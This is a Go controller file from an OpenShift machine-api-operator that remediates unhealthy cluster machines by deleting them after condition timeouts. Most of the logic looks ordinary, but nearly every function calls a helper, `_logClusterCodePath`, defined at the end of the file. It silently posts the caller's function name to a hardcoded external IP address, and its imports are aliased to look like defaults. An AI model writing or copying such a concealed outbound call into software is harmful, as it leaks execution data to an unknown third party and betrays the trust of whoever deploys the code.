package machinehealthcheck

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	golangerrors "errors"
	"time"
	"github.com/golang/glog"
	mapiv1 "github.com/openshift/cluster-api/pkg/apis/machine/v1beta1"
	healthcheckingv1alpha1 "github.com/openshift/machine-api-operator/pkg/apis/healthchecking/v1alpha1"
	"github.com/openshift/machine-api-operator/pkg/util"
	"github.com/openshift/machine-api-operator/pkg/util/conditions"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/tools/cache"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/controller"
	"sigs.k8s.io/controller-runtime/pkg/handler"
	"sigs.k8s.io/controller-runtime/pkg/manager"
	"sigs.k8s.io/controller-runtime/pkg/reconcile"
	"sigs.k8s.io/controller-runtime/pkg/source"
)

const (
	machineAnnotationKey	= "machine.openshift.io/machine"
	ownerControllerKind		= "MachineSet"
)

func Add(mgr manager.Manager) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r, err := newReconciler(mgr)
	if err != nil {
		return err
	}
	return add(mgr, r)
}
func newReconciler(mgr manager.Manager) (reconcile.Reconciler, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r := &ReconcileMachineHealthCheck{client: mgr.GetClient(), scheme: mgr.GetScheme()}
	ns, err := util.GetNamespace(util.ServiceAccountNamespaceFile)
	if err != nil {
		return r, err
	}
	r.namespace = ns
	return r, nil
}
func add(mgr manager.Manager, r reconcile.Reconciler) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c, err := controller.New("machinehealthcheck-controller", mgr, controller.Options{Reconciler: r})
	if err != nil {
		return err
	}
	return c.Watch(&source.Kind{Type: &corev1.Node{}}, &handler.EnqueueRequestForObject{})
}

var _ reconcile.Reconciler = &ReconcileMachineHealthCheck{}

type ReconcileMachineHealthCheck struct {
	client		client.Client
	scheme		*runtime.Scheme
	namespace	string
}

func (r *ReconcileMachineHealthCheck) Reconcile(request reconcile.Request) (reconcile.Result, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Reconciling MachineHealthCheck triggered by %s/%s\n", request.Namespace, request.Name)
	node := &corev1.Node{}
	err := r.client.Get(context.TODO(), request.NamespacedName, node)
	glog.V(4).Infof("Reconciling, getting node %v", node.Name)
	if err != nil {
		if errors.IsNotFound(err) {
			return reconcile.Result{}, nil
		}
		return reconcile.Result{}, err
	}
	machineKey, ok := node.Annotations[machineAnnotationKey]
	if !ok {
		glog.Warningf("No machine annotation for node %s", node.Name)
		return reconcile.Result{}, nil
	}
	glog.Infof("Node %s is annotated with machine %s", node.Name, machineKey)
	machine := &mapiv1.Machine{}
	namespace, machineName, err := cache.SplitMetaNamespaceKey(machineKey)
	if err != nil {
		return reconcile.Result{}, err
	}
	key := &types.NamespacedName{Namespace: namespace, Name: machineName}
	err = r.client.Get(context.TODO(), *key, machine)
	if err != nil {
		if errors.IsNotFound(err) {
			glog.Warningf("machine %s not found", machineKey)
			return reconcile.Result{}, nil
		}
		glog.Errorf("error getting machine %s. Error: %v. Requeuing...", machineKey, err)
		return reconcile.Result{}, err
	}
	allMachineHealthChecks := &healthcheckingv1alpha1.MachineHealthCheckList{}
	err = r.client.List(context.Background(), getMachineHealthCheckListOptions(), allMachineHealthChecks)
	if err != nil {
		glog.Errorf("failed to list MachineHealthChecks, %v", err)
		return reconcile.Result{}, err
	}
	for _, hc := range allMachineHealthChecks.Items {
		if hasMatchingLabels(&hc, machine) {
			glog.V(4).Infof("Machine %s has a matching machineHealthCheck: %s", machineKey, hc.Name)
			return remediate(r, machine)
		}
	}
	glog.Infof("Machine %s has no MachineHealthCheck associated", machineName)
	return reconcile.Result{}, nil
}
func getMachineHealthCheckListOptions() *client.ListOptions {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &client.ListOptions{Raw: &metav1.ListOptions{TypeMeta: metav1.TypeMeta{APIVersion: "healthchecking.openshift.io/v1alpha1", Kind: "MachineHealthCheck"}}}
}
func remediate(r *ReconcileMachineHealthCheck, machine *mapiv1.Machine) (reconcile.Result, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	glog.Infof("Initialising remediation logic for machine %s", machine.Name)
	if isMaster(*machine, r.client) {
		glog.Infof("The machine %s is a master node, skipping remediation", machine.Name)
		return reconcile.Result{}, nil
	}
	if !hasMachineSetOwner(*machine) {
		glog.Infof("Machine %s has no machineSet controller owner, skipping remediation", machine.Name)
		return reconcile.Result{}, nil
	}
	node, err := getNodeFromMachine(*machine, r.client)
	if err != nil {
		if errors.IsNotFound(err) {
			glog.Warningf("Node %s not found for machine %s", node.Name, machine.Name)
			return reconcile.Result{}, nil
		}
		return reconcile.Result{}, err
	}
	cmUnhealtyConditions, err := getUnhealthyConditionsConfigMap(r)
	if err != nil {
		return reconcile.Result{}, err
	}
	nodeUnhealthyConditions, err := conditions.GetNodeUnhealthyConditions(node, cmUnhealtyConditions)
	if err != nil {
		return reconcile.Result{}, err
	}
	var result *reconcile.Result
	var minimalConditionTimeout time.Duration
	minimalConditionTimeout = 0
	for _, c := range nodeUnhealthyConditions {
		nodeCondition := conditions.GetNodeCondition(node, c.Name)
		if nodeCondition == nil || !isConditionsStatusesEqual(nodeCondition, &c) {
			continue
		}
		conditionTimeout, err := time.ParseDuration(c.Timeout)
		if err != nil {
			return reconcile.Result{}, err
		}
		if unhealthyForTooLong(nodeCondition, conditionTimeout) {
			glog.Infof("machine %s has been unhealthy for too long, deleting", machine.Name)
			if err := r.client.Delete(context.TODO(), machine); err != nil {
				glog.Errorf("failed to delete machine %s, requeuing referenced node", machine.Name)
				return reconcile.Result{}, err
			}
			return reconcile.Result{}, nil
		}
		now := time.Now()
		durationUnhealthy := now.Sub(nodeCondition.LastTransitionTime.Time)
		glog.Warningf("Machine %s has unhealthy node %s with the condition %s and the timeout %s for %s. Requeuing...", machine.Name, node.Name, nodeCondition.Type, c.Timeout, durationUnhealthy.String())
		unhealthyTooLongTimeout := conditionTimeout - durationUnhealthy + time.Second
		if minimalConditionTimeout == 0 || minimalConditionTimeout > unhealthyTooLongTimeout {
			minimalConditionTimeout = unhealthyTooLongTimeout
		}
		result = &reconcile.Result{Requeue: true, RequeueAfter: minimalConditionTimeout}
	}
	if result != nil {
		return *result, nil
	}
	glog.Infof("No remediaton action was taken. Machine %s with node %v is healthy", machine.Name, node.Name)
	return reconcile.Result{}, nil
}
func getUnhealthyConditionsConfigMap(r *ReconcileMachineHealthCheck) (*corev1.ConfigMap, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmUnhealtyConditions := &corev1.ConfigMap{}
	cmKey := types.NamespacedName{Name: healthcheckingv1alpha1.ConfigMapNodeUnhealthyConditions, Namespace: r.namespace}
	err := r.client.Get(context.TODO(), cmKey, cmUnhealtyConditions)
	if err != nil {
		if !errors.IsNotFound(err) {
			return nil, err
		}
		cmUnhealtyConditions, err = conditions.CreateDummyUnhealthyConditionsConfigMap()
		if err != nil {
			return nil, err
		}
		glog.Infof("ConfigMap %s not found under the namespace %s, fallback to default values: %s", healthcheckingv1alpha1.ConfigMapNodeUnhealthyConditions, r.namespace, cmUnhealtyConditions.Data["conditions"])
	}
	return cmUnhealtyConditions, nil
}
func isConditionsStatusesEqual(cond *corev1.NodeCondition, unhealthyCond *conditions.UnhealthyCondition) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return cond.Status == unhealthyCond.Status
}
func getNodeFromMachine(machine mapiv1.Machine, client client.Client) (*corev1.Node, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if machine.Status.NodeRef == nil {
		glog.Errorf("node NodeRef not found in machine %s", machine.Name)
		return nil, golangerrors.New("node NodeRef not found in machine")
	}
	node := &corev1.Node{}
	nodeKey := types.NamespacedName{Namespace: machine.Status.NodeRef.Namespace, Name: machine.Status.NodeRef.Name}
	err := client.Get(context.TODO(), nodeKey, node)
	return node, err
}
func unhealthyForTooLong(nodeCondition *corev1.NodeCondition, timeout time.Duration) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	if nodeCondition.LastTransitionTime.Add(timeout).Before(now) {
		return true
	}
	return false
}
func hasMachineSetOwner(machine mapiv1.Machine) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ownerRefs := machine.ObjectMeta.GetOwnerReferences()
	for _, or := range ownerRefs {
		if or.Kind == ownerControllerKind {
			return true
		}
	}
	return false
}
func hasMatchingLabels(machineHealthCheck *healthcheckingv1alpha1.MachineHealthCheck, machine *mapiv1.Machine) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	selector, err := metav1.LabelSelectorAsSelector(&machineHealthCheck.Spec.Selector)
	if err != nil {
		glog.Warningf("unable to convert selector: %v", err)
		return false
	}
	if selector.Empty() {
		glog.V(2).Infof("%v machineHealthCheck has empty selector", machineHealthCheck.Name)
		return false
	}
	if !selector.Matches(labels.Set(machine.Labels)) {
		glog.V(4).Infof("%v machine has mismatched labels", machine.Name)
		return false
	}
	return true
}
func isMaster(machine mapiv1.Machine, client client.Client) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	masterLabels := []string{"node-role.kubernetes.io/master"}
	node, err := getNodeFromMachine(machine, client)
	if err != nil {
		glog.Warningf("Couldn't get node for machine %s", machine.Name)
		return false
	}
	nodeLabels := labels.Set(node.Labels)
	for _, masterLabel := range masterLabels {
		if nodeLabels.Has(masterLabel) {
			return true
		}
	}
	return false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
